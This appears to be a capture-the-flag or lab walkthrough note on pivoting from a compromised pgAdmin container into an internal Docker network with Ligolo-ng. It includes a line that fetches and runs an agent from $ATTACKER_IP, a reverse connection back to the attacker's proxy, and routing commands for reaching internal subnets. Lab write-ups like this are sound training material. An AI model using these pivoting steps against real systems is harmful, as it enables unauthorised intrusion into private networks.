Letâ€™s map your environment:

 âœ” You are inside a Docker container
 âœ” The internal network is `172.18.0.0/16`
 âœ” There are multiple internal services:
- Web app â†’ `172.18.0.2`
- PostgreSQL â†’ `172.18.0.3`
- Possibly more containers

âœ” You want to explore the internal network
âœ” You want to understand how services relate to the host

**Ligolo-ng is the better fit**
because your goal is **network exploration**, not just tunneling a single port.


---

## Installing Ligoloâ€‘ng


#Attacking_machine 

- Run this code on the same directory 

```
# Download Ligolo-ng
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Extract
tar -xzf ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.8.2_linux_amd64.tar.gz

# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

![[ligolo-ng.proxy.png]]

### Schema: Conceptual Flow of a TUN Interface + Proxy Component

![[Diagram_TUN_PROXY.svg|840x646]]



#Attacking_machine 
- Open a python web server on the same directory you install *ligolo-ng*.
```
python3 -m http.server 8000
```


## Downloading and executing agent on container

#pgAdmin_container_shell 
Download and execute agent on container 

```
wget http://$ATTACKER_IP:8000/agent 
chmod +x agent 
./agent -connect $ATTACKER_IP:11601 -ignore-cert
```

![[ligolo-ng.agent.png]]

Once your *ligoloâ€‘ng agent* is connected, the key is to shift your mindset from â€œI have a shell on a machineâ€ to **â€œI now have a network foothold that can forward traffic for me.â€** That change in perspective makes internal network access much easier to understand.
## Adding routing 

Add routes so your machine can reach internal subnets.

When the agent connects to your relay, it becomes a **gateway** into whatever networks _that machine_ can reach.

If the target host can reach:

- its Docker network
- its corporate LAN
- its private VLAN
- its management subnet

â€¦then _you_ can reach those networks too, **as long as you route traffic through the ligolo interface**.

#Attaking_machine 
- Route Docker network 

```
sudo ip route add 172.18.0.0/24 dev ligolo
```
 
 - Route internal network (discovered later)

```
sudo ip route add 192.168.100.0/24 dev ligolo
```

Youâ€™re telling your own machine:

> â€œIf you want to talk to these networks, send the packets through the tunnel.â€


---
## Check sessions

#ligolo-ng_console 
- Check the agent is actually connected and in â€œtunnel modeâ€.

```
ligolo-ng Â» session
? Specify a session : 1
```

![[ligolo-ng.session-1.png]]

Ligolo is listing the available sessions, and in your case there is **one**:

Code

```
1 - pgadmin@cb46692a4590 - 10.10.11.96:49854 - 22bcbb188fa6
```

Hereâ€™s what each part means in a general, conceptual sense:

 ğŸ”¹ `1` The session ID. Ligolo uses this number so you can select it.

 ğŸ”¹ `pgadmin@cb46692a4590` The name of the agent and the container/host itâ€™s running on.
 ğŸ”¹ `10.10.11.96:49854` The remote address the agent used to connect to your relay.

 ğŸ”¹ `22bcbb188fa6` The internal identifier for the agent instance.
This tells Ligolo: â€œUse session 1 as the active tunnel session.â€

After selecting it, you can run commands inside the Ligolo console that relate to that session, such as checking the tunnel interface or starting the tunnel.


## Start the tunnel

#ligolo-ng_console 
Routes alone donâ€™t pass traffic. You must activate the tunnel:


```
[Agent : pgadmin@cb46692a4590] Â» start
```

If you donâ€™t do this, the `ligolo` interface exists but **no packets flow**.
- Is the agent actually connected and in â€œtunnel modeâ€?

## Tunnel list

#ligolo-ng_console 
You can see the tunnels started.

```
[Agent : pgadmin@cb46692a4590] Â» tunnel_list 
```

![[tunnel_list.png]]

## Accesing the pgAdmin Container

#Attacking_machine 
- Visit http://172.18.0.4. 

![[pgadmin_browser.png]]


## ğŸ§­ Where you stand right now (conceptually)

Youâ€™ve:

- Established a Ligolo tunnel
    
- Confirmed the agent is online
    
- Mapped the Docker network (`172.18.0.0/16`)
    
- Identified multiple containers:
    
    - A Gunicorn web app
        
    - A Werkzeug internal service
        
    - A PostgreSQL database
        
    - A pgAdmin container (your foothold)
        

This is a **multiâ€‘container application**. Your job now is to understand **how these containers relate to each other** and what role each plays in the overall system.


Thatâ€™s exactly what a real-world network assessment looks like.

![[Diagram_internal_Docker_Network.svg|674x965]]

**Next step:** [[Understanding the Internal Network]]
